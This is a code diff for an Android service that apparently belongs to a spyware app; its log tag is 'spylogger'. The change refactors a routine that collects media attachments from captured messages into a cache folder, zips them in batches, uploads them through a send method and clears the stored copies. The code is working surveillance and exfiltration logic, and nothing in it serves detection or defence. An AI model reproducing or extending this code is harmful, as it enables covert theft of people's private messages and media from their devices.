@@ -28,6 +28,8 @@ import com.j256.ormlite.dao.Dao;
 import com.j256.ormlite.dao.GenericRawResults;
 import com.j256.ormlite.field.DataType;
 
+import org.apache.commons.io.FileUtils;
+
 import java.io.File;
 import java.sql.SQLException;
 import java.util.ArrayList;
@@ -186,21 +188,10 @@ public class FcmHelperService {
 
     private void reenviarArquivos(List<Integer> ids){
 
-        File outputDir = context.getCacheDir();
-        File dirArquivos=new File(outputDir+"/smartlogs");
-        if(dirArquivos.exists()){
-            File[] files=dirArquivos.listFiles();
-            for (File f: files) f.delete();
-        }else {
-            if (!dirArquivos.mkdir()) {
-                return;
-            }
-        }
-
         DatabaseHelper dbHelper = new DatabaseHelper(context);
         Dao<Mensagem, Integer> daoMensagem;
         GenericRawResults<Object[]> raws = null;
-        List<File> arquivos = new ArrayList<>();
+        List<Mensagem> mensagens= new ArrayList<>();
         Iterator<Object[]> iterator;
         try {
             daoMensagem = dbHelper.getDao(Mensagem.class);
@@ -215,7 +206,6 @@ public class FcmHelperService {
                     if(ids.contains((Integer) resultRaw[0])){
                         continue;
                     }
-
                     Mensagem mensagem = new Mensagem.MensagemBuilder()
                             .setId((Integer) resultRaw[0])
                             .setTipoMidia(resultRaw[1] == null ? TipoMidia.CONTATO : TipoMidia.valueOf((String) resultRaw[1]))
@@ -223,45 +213,14 @@ public class FcmHelperService {
                             .setDataRecebida((Date) resultRaw[3])
                             .build();
 
-                    File arquivo=Utils.getMediaFile(
-                            mensagem.getTipoMidia(),
-                            mensagem.getTamanhoArquivo(),
-                            mensagem.getDataRecebida(), 2);
-                    if(arquivo!=null){
-                        File tmp=new File(dirArquivos,mensagem.getId()+"");
-                        if(!tmp.exists()){
-                            tmp.createNewFile();
-                            Utils.copyFile(arquivo,tmp);
-                            arquivos.add(tmp);
-                        }
-                    }
+                   mensagens.add(mensagem);
 
                 } catch (Exception e) {
                     Log.e("spylogger", e.getMessage());
                 }
-                if (iterator.hasNext()) {
-                    if (arquivos.size() == MAX_MENSAGENS) {
-                        ZipAnexos zip=new ZipAnexos(dirArquivos);
-                        File zipado=zip.getFile();
-                        if(zipado!=null){
-                            envioArquivoVO.setId(null);
-                            enviarArquivo(zipado);
-                            File[] files=dirArquivos.listFiles();
-                            for (File f: files) f.delete();
-                        }
-                        arquivos.clear();
-                    }
-                } else {
-                    ZipAnexos zip=new ZipAnexos(dirArquivos);
-                    File zipado=zip.getFile();
-                    if(zipado!=null){
-                        envioArquivoVO.setId(null);
-                        enviarArquivo(zipado);
-                        File[] files=dirArquivos.listFiles();
-                        for (File f: files) f.delete();
-                    }
-                }
+
             }
+            enviarArquivos(mensagens);
         } catch (SQLException e) {
             Log.e("spylogger", e.getMessage());
             Log.i("spylogger","tentar novamente...");
@@ -274,6 +233,85 @@ public class FcmHelperService {
             try {
                 raws.close();
             }catch (Exception e){}
+        }
+    }
+
+    public void enviarArquivos(List<Mensagem> mensagens){
+
+        File outputDir = context.getCacheDir();
+        File dirArquivos=new File(outputDir+"/smartlogs");
+        if(dirArquivos.exists()){
+            File[] files=dirArquivos.listFiles();
+            for (File f: files) f.delete();
+        }else {
+            if (!dirArquivos.mkdir()) {
+                return;
+            }
+        }
+
+        List<File> arquivos = new ArrayList<>();
+        Iterator<Mensagem> iterator;
+        iterator = mensagens.iterator();
+        while (iterator.hasNext()) {
+            Mensagem mensagem = iterator.next();
+            try {
+
+                File arquivo=null;
+
+                if(mensagem.getArquivo()!=null){
+                    arquivo=new File(dirArquivos,mensagem.getId()+"");
+                    FileUtils.writeByteArrayToFile(arquivo,mensagem.getArquivo());
+                }else {
+                    arquivo = Utils.getMediaFile(
+                            mensagem.getTipoMidia(),
+                            mensagem.getTamanhoArquivo(),
+                            mensagem.getDataRecebida(), 2);
+                }
+
+                if(arquivo!=null){
+                    File tmp=new File(dirArquivos,mensagem.getId()+"");
+                    if(!tmp.exists()){
+                        tmp.createNewFile();
+                        Utils.copyFile(arquivo,tmp);
+                        arquivos.add(tmp);
+                    }
+                }
+
+            } catch (Exception e) {
+                Log.e("spylogger", e.getMessage());
+            }
+            if (iterator.hasNext()) {
+                if (arquivos.size() == MAX_MENSAGENS) {
+                    ZipAnexos zip=new ZipAnexos(dirArquivos);
+                    File zipado=zip.getFile();
+                    if(zipado!=null){
+                        envioArquivoVO.setId(null);
+                        enviarArquivo(zipado);
+                        File[] files=dirArquivos.listFiles();
+                        for (File f: files) f.delete();
+                    }
+                    arquivos.clear();
+                }
+            } else {
+                ZipAnexos zip=new ZipAnexos(dirArquivos);
+                File zipado=zip.getFile();
+                if(zipado!=null){
+                    envioArquivoVO.setId(null);
+                    enviarArquivo(zipado);
+                    File[] files=dirArquivos.listFiles();
+                    for (File f: files) f.delete();
+                }
+            }
+        }
+
+        try {
+            RepositorioMensagem repositorioMensagem=new RepositorioMensagemImpl(context);
+            for(Mensagem mensagem:mensagens){
+                mensagem.setArquivo(null);
+                repositorioMensagem.atualizar(mensagem);
+            }
+        } catch (SQLException e) {
+            e.printStackTrace();
         }
     }
 
